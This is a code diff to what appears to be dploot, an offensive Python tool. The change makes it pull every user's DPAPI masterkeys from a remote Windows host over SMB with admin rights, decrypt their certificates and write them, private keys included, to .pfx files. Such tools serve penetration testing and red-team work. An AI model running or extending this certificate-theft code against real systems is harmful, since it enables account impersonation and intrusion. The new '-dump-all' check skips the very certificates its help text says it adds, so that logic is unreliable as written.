@@ -9,13 +9,11 @@ from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target, add_target_argument_group
 from dploot.lib.utils import handle_outputdir_option, parse_file_as_list
 from dploot.triage.certificates import CertificatesTriage
-from dploot.triage.masterkeys import MasterkeysTriage
+from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
 
 NAME = 'certificates'
 
 class CertificatesAction:
-
-    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
 
     def __init__(self, options: argparse.Namespace) -> None:
         self.options = options
@@ -33,7 +31,7 @@ class CertificatesAction:
 
         if self.options.mkfile is not None:
             try:
-                self.masterkeys = parse_file_as_list(self.options.mkfile)
+                self.masterkeys = parse_masterkey_file(self.options.mkfile)
             except Exception as e:
                 logging.error(str(e))
                 sys.exit(1)
@@ -46,16 +44,31 @@ class CertificatesAction:
 
     def run(self) -> None:
         self.connect()
-        logging.info("Connected to %s as %s\\%s %s" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
-        if self.masterkeys is None:
-            masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
-            masterkeytriage.triage_masterkeys()
-            self.masterkeys = masterkeytriage.masterkeys
-            for masterkey in self.masterkeys:
-                print(masterkey)
+        logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
         if self.is_admin:
+            if self.masterkeys is None:
+                masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
+                logging.info("Triage ALL USERS masterkeys\n")
+                self.masterkeys = masterkeytriage.triage_masterkeys()
+                if not self.options.quiet: 
+                    for masterkey in self.masterkeys:
+                        masterkey.dump()
+                    print()
+                
             triage = CertificatesTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
-            triage.triage_certificates()
+            logging.info('Triage Certificates for ALL USERS\n')
+            certificates = triage.triage_certificates()
+            for certificate in certificates:
+                if self.options.dump_all and not certificate.clientauth:
+                    continue
+                if not self.options.quiet:
+                    certificate.dump()
+                filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
+                logging.critical("Writting certificate to %s" % filename)
+                if not self.options.quiet:
+                    print() # better outputing
+                with open(filename, "wb") as f:
+                    f.write(certificate.pfx)
             if self.outputdir is not None:
                 for filename, bytes in triage.looted_files.items():
                     with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
@@ -90,6 +103,14 @@ def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable
     )
 
     add_masterkeys_argument_group(group)
+
+    group.add_argument(
+        "-dump-all",
+        action="store_true",
+        help=(
+            "Dump also certificates not used for client authentication"
+        )
+    )
 
     group.add_argument(
         "-export-certificates",
